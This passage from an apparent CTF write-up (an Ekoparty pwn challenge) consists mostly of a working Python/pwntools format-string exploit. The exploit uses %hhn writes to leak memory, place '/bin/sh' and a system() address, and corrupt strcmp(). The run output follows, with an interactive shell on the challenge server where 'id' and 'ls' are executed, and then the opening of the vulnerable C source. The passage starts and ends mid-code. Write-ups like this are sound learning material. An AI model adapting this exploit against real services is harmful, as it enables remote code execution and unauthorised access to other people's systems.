</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%67c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># final byte, 0xbffff943</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..43 to &#39;13&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%124$s&quot;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;Ent&#39;</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read4</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
</span><span class='line'>  <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>      <span class="c">#value &lt;&lt;= 8</span>
</span><span class='line'>      <span class="n">value</span> <span class="o">+=</span> <span class="n">read1</span><span class="p">(</span><span class="n">address</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>  <span class="k">return</span> <span class="n">value</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">):</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%65c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff941</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..41 to &#39;20&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff942</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..42 to &#39;37&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%67c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># final byte, 0xbffff943</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..43 to &#39;13&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%124$s&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">:]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write1</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">):</span>
</span><span class='line'><span class="c">#       argument 25 contains 0xbffff844,</span>
</span><span class='line'><span class="c">#                               which points to 0xbffff958</span>
</span><span class='line'><span class="c">#       so we can use 25 to modify position 61 to write something on the stack!</span>
</span><span class='line'><span class="c">#       addr = 0xbffff758 # = argument 2</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">where</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%65c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff941</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">where</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..41 to &#39;20&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff942</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">where</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..42 to &#39;37&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%67c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># final byte, 0xbffff943</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">where</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..43 to &#39;13&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># write byte</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">what</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">:</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">what</span><span class="p">))</span><span class="o">+</span><span class="s">&quot;c%124$hhn&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">what</span><span class="p">))</span><span class="o">+</span><span class="s">&quot;c%124$hn&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">writebytes</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">what</span><span class="p">)):</span>
</span><span class='line'>      <span class="n">write1</span><span class="p">(</span><span class="n">what</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">where</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'><span class="k">global</span> <span class="n">conn</span>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#39;challs.ctf.site&#39;</span><span class="p">,</span> <span class="mi">20002</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] writing /bin/sh to 0x13373008&quot;</span>
</span><span class='line'><span class="n">writebytes</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">,</span> <span class="mh">0x13373008</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] writing system() to 0x13372020&quot;</span>
</span><span class='line'><span class="n">writebytes</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xb7e69cd0</span><span class="p">),</span> <span class="mh">0x13372020</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] fucking up strcmp()&quot;</span>
</span><span class='line'><span class="n">writebytes</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x1f</span><span class="s">&quot;</span><span class="p">,</span> <span class="mh">0x13372011</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yeah. Pretty horrible.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ekoparty</span><span class="o">-</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn20</span><span class="err">$</span> <span class="n">python</span> <span class="n">pwnpoc</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">challs</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">site</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">20002</span><span class="p">:</span> <span class="n">Done</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">writing</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="n">to</span> <span class="mh">0x13373008</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">writing</span> <span class="n">system</span><span class="p">()</span> <span class="n">to</span> <span class="mh">0x13372020</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">fucking</span> <span class="n">up</span> <span class="n">strcmp</span><span class="p">()</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
</span><span class='line'><span class="err">$</span> <span class="nb">id</span>
</span><span class='line'><span class="err">$</span> <span class="nb">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">simple</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">simple</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">simple</span><span class="p">)</span>
</span><span class='line'><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">simple</span>
</span><span class='line'><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
</span><span class='line'><span class="n">total</span> <span class="mi">68</span>
</span><span class='line'><span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">2</span> <span class="n">simple</span> <span class="n">simple</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span>
</span><span class='line'><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">root</span>   <span class="n">root</span>    <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">12</span> <span class="mi">21</span><span class="p">:</span><span class="mi">10</span> <span class="o">..</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>   <span class="mi">145</span> <span class="n">Sep</span> <span class="mi">12</span> <span class="mi">21</span><span class="p">:</span><span class="mi">13</span> <span class="o">.</span><span class="n">bash_history</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>   <span class="mi">220</span> <span class="n">Oct</span>  <span class="mi">7</span>  <span class="mi">2014</span> <span class="o">.</span><span class="n">bash_logout</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>  <span class="mi">3637</span> <span class="n">Oct</span>  <span class="mi">7</span>  <span class="mi">2014</span> <span class="o">.</span><span class="n">bashrc</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>   <span class="mi">675</span> <span class="n">Oct</span>  <span class="mi">7</span>  <span class="mi">2014</span> <span class="o">.</span><span class="n">profile</span>
</span><span class='line'><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">27095</span> <span class="n">Nov</span> <span class="mi">17</span>  <span class="mi">2011</span> <span class="n">checksec</span><span class="o">.</span><span class="n">sh</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>    <span class="mi">35</span> <span class="n">Sep</span> <span class="mi">14</span> <span class="mi">23</span><span class="p">:</span><span class="mi">37</span> <span class="n">flag</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">simple</span>  <span class="mi">1904</span> <span class="n">Aug</span> <span class="mi">27</span> <span class="mo">01</span><span class="p">:</span><span class="mi">08</span> <span class="n">fmt_001</span><span class="o">.</span><span class="n">c</span>
</span><span class='line'><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">simple</span>  <span class="mi">5776</span> <span class="n">Aug</span> <span class="mi">27</span> <span class="mo">01</span><span class="p">:</span><span class="mi">08</span> <span class="n">greetings</span>
</span><span class='line'><span class="n">Hi</span> <span class="nb">id</span>
</span><span class='line'>
</span><span class='line'><span class="n">OMG</span><span class="err">!</span> <span class="n">nice</span> <span class="n">work</span><span class="p">,</span> <span class="n">your</span> <span class="n">flag</span> <span class="ow">is</span><span class="p">:</span> <span class="o">^</span>\<span class="n">x10LnBye</span><span class="err">!</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="ow">in</span> <span class="n">interactive</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>After 10 seconds, we got kicked out, but that was enough time to grab some files. Sadly, the flag file was not the flag&hellip; someone planted it there (thanks! but no thanks). So we grabbed the C source file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include  &lt;signal.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">mkey</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">mkey_crypt</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;</span><span class="se">\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf</span><span class="s">&quot;</span> <span class="p">};</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">fmt</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;</span><span class="se">\x71\x73\x27\x1f\x1d\x48\x47</span><span class="s">&quot;</span> <span class="p">};</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">flag</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;</span><span class="se">\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b</span><span class="s">&quot;</span> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="nf">decrypt</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">len_key</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">len_msg</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">len_key</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">out</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WTF no memory :s&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len_msg</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len_msg</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
